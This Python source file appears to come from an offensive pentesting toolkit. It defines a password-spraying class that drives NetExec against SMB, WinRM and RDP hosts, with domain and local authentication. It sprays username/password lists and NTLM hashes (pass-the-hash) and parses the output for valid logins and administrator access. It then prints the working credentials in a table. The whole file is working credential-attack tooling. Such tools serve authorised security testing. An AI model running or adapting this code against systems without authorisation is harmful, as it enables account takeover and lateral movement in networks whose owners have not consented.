import re
import tempfile
import os
from rich.console import Console
from rich.table import Table
from rich.text import Text
from rich import box
from .models import EnumSession, CredentialResult
from .runner import Runner

# Captures the whole credential token; we split domain\user:pass manually below
NXC_LINE_RE = re.compile(
    r"(SMB|WINRM|RDP)\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+\S+\s+(\[[\+\-\!]\])\s+(\S+)"
)


class PasswordSprayer:
    def __init__(self, console: Console, session: EnumSession, no_report: bool = False):
        self.console = console
        self.session = session
        self.no_report = no_report
        self.runner = Runner(console, session)

    def run(
        self,
        ips: list[str],
        users: list[str],
        passwords: list[str],
        ntlms: list[str] | None = None,
        no_brute: bool = False,
        continue_on_success: bool = False,
    ):
        self.console.rule("[bold #7aab7a]  Password Spray  ", style="#30363d")

        ip_target, ip_tmp = self._tmp(ips)
        user_target, user_tmp = self._tmp(users)
        tmps = [f for f in [ip_tmp, user_tmp] if f]

        try:
            # ── password spray ──────────────────────────────────────────────
            if passwords:
                pass_target, pass_tmp = self._tmp(passwords)
                if pass_tmp:
                    tmps.append(pass_tmp)

                effective_no_brute = no_brute
                if no_brute and len(users) != len(passwords):
                    self.console.print(
                        f"  [yellow]⚠  --no-brute requires equal user/password counts "
                        f"({len(users)} users vs {len(passwords)} passwords). "
                        f"Switching to spray mode.[/yellow]"
                    )
                    effective_no_brute = False

                for proto in ["smb", "winrm", "rdp"]:
                    for local_auth in [False, True]:
                        tag = " (local)" if local_auth else ""
                        cmd = ["nxc", proto, ip_target, "-u", user_target, "-p", pass_target]
                        if effective_no_brute:
                            cmd.append("--no-brute")
                        if continue_on_success:
                            cmd.append("--continue-on-success")
                        if local_auth:
                            cmd.append("--local-auth")
                        record = self.runner.run(cmd, label=f"{proto.upper()} Password Spray{tag}")
                        self._parse(record.output, is_ntlm=False, local_auth=local_auth)

            # ── NTLM hash spray ─────────────────────────────────────────────
            if ntlms:
                self.console.print("\n  [dim #8b949e]  Running NTLM hash spray (-H)...[/dim #8b949e]")
                hash_target, hash_tmp = self._tmp(ntlms)
                if hash_tmp:
                    tmps.append(hash_tmp)

                for proto in ["smb", "winrm", "rdp"]:
                    for local_auth in [False, True]:
                        tag = " (local)" if local_auth else ""
                        cmd = ["nxc", proto, ip_target, "-u", user_target, "-H", hash_target]
                        if continue_on_success:
                            cmd.append("--continue-on-success")
                        if local_auth:
                            cmd.append("--local-auth")
                        record = self.runner.run(cmd, label=f"{proto.upper()} Hash Spray{tag}")
                        self._parse(record.output, is_ntlm=True, local_auth=local_auth)

        finally:
            for f in tmps:
                try:
                    os.unlink(f)
                except OSError:
                    pass

        self._display_results()

    def _tmp(self, values: list[str]) -> tuple[str, str | None]:
        if len(values) == 1:
            return values[0], None
        f = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
        f.write("\n".join(values))
        f.close()
        return f.name, f.name

    def _parse(self, output: str, is_ntlm: bool = False, local_auth: bool = False):
        for line in output.splitlines():
            m = NXC_LINE_RE.search(line)
            if not m:
                continue
            proto, ip, status, cred_token = m.groups()

            user_pass = cred_token
            if "\\" in cred_token:
                user_pass = cred_token.split("\\", 1)[1]
            elif "/" in cred_token and ":" in cred_token.split("/", 1)[1]:
                user_pass = cred_token.split("/", 1)[1]

            if ":" not in user_pass:
                continue
            user, secret = user_pass.split(":", 1)

            self.session.credentials.append(
                CredentialResult(
                    username=user,
                    password=secret,
                    ip=ip,
                    protocol=proto,
                    success="+" in status,
                    is_admin="Pwn3d!" in line,
                    is_ntlm=is_ntlm,
                    local_auth=local_auth,
                )
            )

    def _display_results(self):
        successes = [c for c in self.session.credentials if c.success]
        if not successes:
            self.console.print("[dim]  No successful logins.[/dim]\n")
            return

        self.console.print(f"\n  [bold #7aab7a]✓ {len(successes)} credential(s) worked![/bold #7aab7a]\n")

        table = Table(
            box=box.SIMPLE_HEAD,
            border_style="#30363d",
            header_style="bold #c9a96e",
            show_edge=False,
            padding=(0, 1),
        )
        table.add_column("Protocol", style="#8b949e")
        table.add_column("Host", style="#c0c8d4")
        table.add_column("Username", style="#7aab7a")
        table.add_column("Password / Hash", style="#e6edf3")
        table.add_column("Auth", style="#8b949e")
        table.add_column("Admin?", justify="center")

        for cred in successes:
            host = self.session.hosts.get(cred.ip)
            name = host.display_name if host else cred.ip
            admin = Text("👑 YES", style="bold yellow") if cred.is_admin else Text("—", style="dim")
            auth_type = Text("LOCAL", style="#c9a96e") if cred.local_auth else Text("DOMAIN", style="#7aab7a")
            table.add_row(cred.protocol, name, cred.username, cred.password, auth_type, admin)

        self.console.print(table)
        self.console.print()
